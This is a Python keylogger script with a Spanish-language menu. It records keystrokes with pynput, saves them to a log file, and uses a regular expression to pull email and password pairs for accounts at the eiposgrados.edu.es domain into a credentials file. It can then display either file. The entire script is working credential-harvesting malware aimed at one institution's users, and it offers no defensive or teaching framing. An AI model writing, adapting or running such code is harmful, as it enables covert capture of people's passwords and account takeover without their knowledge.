#!/usr/bin/env python
import enum
import pathlib
import re

from pynput import keyboard as kb

from processor import KeyProcessor

BASE_DIR = pathlib.Path(__file__).resolve().parent
LOGS = BASE_DIR / 'keylog.txt'
CREDENTIALS = BASE_DIR / 'credentials.txt'
EMAIL_PATTERN = re.compile(r'(?P<email>[^@\s]+@eiposgrados\.edu\.es)\s+(?P<password>[^\s]+)', flags=re.MULTILINE)


class Option(enum.Enum):
    RECORD_KEYS = 1
    READ_LOGS = 2
    READ_CREDENTIALS = 3


def print_data_console(key_pc):
    key_pc.print_current_key()


def save_in_file(path, data):
    with open(path, 'a', encoding='utf-8') as fp:
        fp.write(data.strip())


def detect_eip_password(path):
    with open(path, 'r', encoding='utf-8') as fp:
        data = fp.read()

    with open(CREDENTIALS, 'a', encoding='utf-8') as fp:
        for match in EMAIL_PATTERN.findall(data):
            fp.write(f'{match[0]} {match[1]}\n')


def record_key():
    key_pc = KeyProcessor()
    with kb.Events() as keyboard_events:
        for event in keyboard_events:
            if event.key == kb.Key.esc:
                break
            elif isinstance(event, kb.Events.Press):
                key_pc.process(event.key)
                print_data_console(key_pc)

    save_in_file(LOGS, key_pc.data)
    detect_eip_password(LOGS)


def display_file(path):
    with open(path, 'r', encoding='utf-8') as fp:
        for line in fp:
            print(line)


def read_logs():
    display_file(LOGS)


def read_credentials():
    display_file(CREDENTIALS)


def logo(path):
    with open(path, 'r', encoding='utf-8') as input_file:
        ascii_art = ''.join(input_file.readlines())

    return ascii_art


def menu():
    display = '\n'.join([
        '¿Qué desea hacer?',
        '\t(1) Registrar pulsaciones de teclado',
        '\t(2) Leer registros',
        '\t(3) Leer credenciales'
    ])

    return display


def choose(option):
    try:
        option = Option(int(option))
        if option == Option.RECORD_KEYS:
            record_key()
        elif option == Option.READ_LOGS:
            read_logs()
        elif option == Option.READ_CREDENTIALS:
            read_credentials()

    except ValueError:
        reason = 'Opción no válida' if len(option) > 0 else 'No se ha elegido nada'
        print(reason)


def main():
    print(logo(BASE_DIR / 'logo.txt'))
    stay = True
    while stay:
        print(menu())
        option = input('Escoja una opción [1-3] (Q para salir): ').lower().strip()
        if option == 'q':
            stay = False
        else:
            choose(option)

    print('¡Hasta otra!')


if __name__ == '__main__':
    main()
